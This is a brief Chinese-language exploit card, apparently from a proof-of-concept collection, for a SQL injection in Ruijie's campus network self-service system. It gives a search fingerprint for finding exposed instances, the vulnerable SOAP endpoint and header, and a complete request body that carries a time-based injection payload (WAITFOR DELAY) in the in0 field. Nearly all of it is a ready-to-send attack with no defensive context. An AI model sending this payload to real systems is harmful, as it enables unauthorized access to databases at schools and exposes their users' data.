# 锐捷校园网自助服务系统operatorReportorRoamServiceSQL注入漏洞

- **系统**：锐捷　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=="校园网自助服务系统"`
- **请求**：`POST /selfservice/service/operatorReportorRoamService HTTP/1.1`
- **关键头**：`Content-Type: text/xml;charset=UTF-8`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.webservice.common.spl.ruijie.com">
<soapenv:Header/>
<soapenv:Body>
<ser:queryOperatorUuid>
<!--type: string-->
<ser:in0>';WAITFOR DELAY '0:0:5'--</ser:in0>
</ser:queryOperatorUuid>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：999　|　—